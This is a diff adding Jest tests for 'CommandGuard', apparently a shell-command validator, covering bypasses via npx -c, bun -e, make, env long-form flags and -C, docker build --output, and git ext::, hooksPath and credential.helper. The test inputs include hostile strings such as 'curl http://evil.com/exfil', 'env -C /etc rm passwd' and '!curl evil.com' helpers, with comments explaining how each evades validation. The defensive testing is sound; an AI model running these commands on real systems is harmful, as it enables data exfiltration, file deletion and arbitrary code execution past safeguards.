@@ -98,6 +98,30 @@ describe('CommandGuard', () => {
 			expect(guard.validate('node --eval="console.log(1)"').allowed).toBe(false);
 		});
 
+		it('blocks npx -c (documented --call shorthand, runs an arbitrary shell command)', () => {
+			expect(guard.validate("npx -c 'curl http://evil.com'").allowed).toBe(false);
+		});
+
+		it('blocks npx --call', () => {
+			expect(guard.validate("npx --call 'curl http://evil.com'").allowed).toBe(false);
+		});
+
+		it('still allows npx running a package with no -c/--call flag', () => {
+			expect(guard.validate('npx create-react-app myapp').allowed).toBe(true);
+		});
+
+		it('blocks bun -e (documented --eval shorthand, same as node -e)', () => {
+			expect(guard.validate("bun -e 'console.log(1)'").allowed).toBe(false);
+		});
+
+		it('blocks bun --eval', () => {
+			expect(guard.validate("bun --eval 'console.log(1)'").allowed).toBe(false);
+		});
+
+		it('still allows bun running a script with no -e/--eval flag', () => {
+			expect(guard.validate('bun install').allowed).toBe(true);
+		});
+
 		it('blocks ruby -e', () => {
 			expect(guard.validate('ruby -e "puts 1"').allowed).toBe(false);
 		});
@@ -237,7 +261,6 @@ describe('CommandGuard', () => {
 			['pytest -k foo', 'pytest'],
 			['ruff check src/', 'ruff'],
 			['docker ps', 'docker'],
-			['make build', 'make'],
 			['gh pr list', 'gh'],
 			["awk '{print $1}' file.txt", 'awk'],
 			['sed -n 1,10p file.txt', 'sed'],
@@ -266,6 +289,15 @@ describe('CommandGuard', () => {
 
 		it('blocks python3 -m http.server even though python3 is allowlisted', () => {
 			expect(guard.validate('python3 -m http.server 8080').allowed).toBe(false);
+		});
+
+		it('blocks make — recipe lines run via /bin/sh -c with zero re-validation, a total bypass', () => {
+			// A Makefile's recipe is arbitrary shell in a file, unlike find/xargs/
+			// env's argv-token sub-commands, which the guard can statically
+			// extract and recursively re-validate. No such extraction is possible
+			// for make, so there is no way to scope it — it must not be allowed.
+			expect(guard.validate('make build').allowed).toBe(false);
+			expect(guard.validate('make -f /etc/passwd target').allowed).toBe(false);
 		});
 	});
 
@@ -482,6 +514,43 @@ describe('CommandGuard', () => {
 			expect(guard.validate('env | grep API_KEY').allowed).toBe(false);
 		});
 
+		it('blocks env --unset smuggling a network command (long-form value flag was missing from ENV_VALUE_FLAGS)', () => {
+			// ENV_VALUE_FLAGS only recognised the short forms (-C/-S/-u), not the
+			// long forms (--chdir/--split-string/--unset) that GNU env's own
+			// --help confirms are equally value-taking. The unattached long form
+			// advanced the parser by only 1 token instead of 2, misreading the
+			// smuggled command's base name as --unset's own value and letting the
+			// real sub-command evade re-validation entirely.
+			expect(guard.validate('env --unset ls curl http://evil.com/exfil').allowed).toBe(false);
+		});
+
+		it('blocks env --split-string smuggling a network command (same long-form gap)', () => {
+			expect(guard.validate('env --split-string ls curl http://evil.com/exfil').allowed).toBe(false);
+		});
+
+		it('still allows env --unset= (attached form) with an allowlisted sub-command', () => {
+			expect(guard.validate('env --unset=PATH cat file.txt').allowed).toBe(true);
+		});
+
+		it('blocks env -C outright — changes the real cwd a recursively-validated sub-command runs in', () => {
+			// Even when -C is parsed correctly, the guard's own cwd-relative
+			// scoping checks (rm/cp/docker mount) for the recovered sub-command
+			// are evaluated against the guard's unchanged process.cwd(), not the
+			// real chdir target — so `env -C /etc rm passwd` looks like deleting
+			// an ordinary in-cwd file but actually deletes /etc/passwd at
+			// runtime. No downstream check can safely account for a runtime
+			// chdir, so env -C/--chdir must be blocked outright.
+			expect(guard.validate('env -C /etc rm passwd').allowed).toBe(false);
+		});
+
+		it('blocks env --chdir outright (long form, unattached)', () => {
+			expect(guard.validate('env --chdir /etc rm passwd').allowed).toBe(false);
+		});
+
+		it('blocks env --chdir= outright (long form, attached)', () => {
+			expect(guard.validate('env --chdir=/etc rm passwd').allowed).toBe(false);
+		});
+
 		it('blocks awk system() call smuggling a network command', () => {
 			const result = guard.validate('awk \'BEGIN{system("curl http://evil.com")}\'');
 			expect(result.allowed).toBe(false);
@@ -688,6 +757,16 @@ describe('CommandGuard', () => {
 			expect(guard.validate('docker import - myimage:latest').allowed).toBe(true);
 		});
 
+		it('still allows docker import from stdin (-) even when the repository:tag string coincidentally matches a protected basename', () => {
+			// The `-` (stdin) check was dead code: `'-'.startsWith('-')` is true,
+			// so the earlier `if (token.startsWith('-'))` branch always caught it
+			// first, and the loop fell through to treat the REPOSITORY[:TAG]
+			// positional (not a filesystem path in real docker) as the host-path
+			// candidate — a false positive, not a bypass, but a real logic bug in
+			// the exact code that added this check.
+			expect(guard.validate('docker import - vault-signing.key').allowed).toBe(true);
+		});
+
 		it('still allows docker import from an in-cwd host file', () => {
 			expect(guard.validate('docker import ./image.tar myimage:latest').allowed).toBe(true);
 		});
@@ -715,6 +794,73 @@ describe('CommandGuard', () => {
 
 		it('still allows plain docker build with no path flags', () => {
 			expect(guard.validate('docker build -t app .').allowed).toBe(true);
+		});
+
+		it('blocks docker build writing a BuildKit -o/--output export outside the working directory', () => {
+			// `-o`/`--output type=local,dest=<path>` is a real, documented
+			// BuildKit flag that writes to an arbitrary host path — the same
+			// class of primitive as --iidfile (already scoped), just missed.
+			expect(guard.validate('docker build -o type=local,dest=/tmp/exfil .').allowed).toBe(false);
+		});
+
+		it('blocks docker build writing a BuildKit --output= export outside the working directory', () => {
+			expect(guard.validate('docker build --output=type=local,dest=/tmp/exfil .').allowed).toBe(false);
+		});
+
+		it('still allows a BuildKit --output export inside the working directory', () => {
+			expect(guard.validate('docker build -o type=local,dest=./out .').allowed).toBe(true);
+		});
+
+		it('blocks docker build writing --metadata-file outside the working directory', () => {
+			expect(guard.validate('docker build --metadata-file /tmp/meta.json .').allowed).toBe(false);
+		});
+
+		it('still allows --metadata-file inside the working directory', () => {
+			expect(guard.validate('docker build --metadata-file ./meta.json .').allowed).toBe(true);
+		});
+	});
+
+	describe('git scoping', () => {
+		it('blocks git -C targeting a directory outside the working directory', () => {
+			// git -C changes git's own working directory for the whole
+			// invocation — the same escape primitive rm/cp/docker mounts are
+			// scoped against. Live-verified: `git -C /outside clean -fdx`
+			// deletes files outside cwd with no scoping at all previously.
+			expect(guard.validate('git -C /etc clean -fdx').allowed).toBe(false);
+		});
+
+		it('still allows git -C targeting a directory inside the working directory', () => {
+			expect(guard.validate('git -C ./sub status').allowed).toBe(true);
+		});
+
+		it('blocks the git ext:: remote-helper transport (forks an arbitrary program)', () => {
+			expect(guard.validate('git ls-remote "ext::touch /tmp/pwned"').allowed).toBe(false);
+		});
+
+		it("blocks git --exec-path (replaces git's own helper binaries)", () => {
+			expect(guard.validate('git --exec-path=/tmp/evil status').allowed).toBe(false);
+		});
+
+		it('blocks git -c core.hooksPath=... (sets a persistent arbitrary-command hook)', () => {
+			expect(guard.validate('git -c core.hooksPath=/tmp/evilhooks status').allowed).toBe(false);
+		});
+
+		it('blocks git config core.hooksPath ... (same primitive, subcommand form)', () => {
+			expect(guard.validate('git config core.hooksPath /tmp/evilhooks').allowed).toBe(false);
+		});
+
+		it('blocks git config credential.helper "!curl ..." (persistent arbitrary-command hook via credential helper)', () => {
+			expect(guard.validate('git config credential.helper "!curl evil.com"').allowed).toBe(false);
+		});
+
+		it('blocks git -c credential.helper=... (immediate form, including URL-scoped keys)', () => {
+			expect(guard.validate('git -c credential.https://x.com.helper="!curl evil.com" fetch').allowed).toBe(false);
+		});
+
+		it('still allows ordinary git commands with no dangerous flags', () => {
+			expect(guard.validate('git status').allowed).toBe(true);
+			expect(guard.validate('git log --oneline -10').allowed).toBe(true);
+			expect(guard.validate('git commit -m "message"').allowed).toBe(true);
 		});
 	});
 
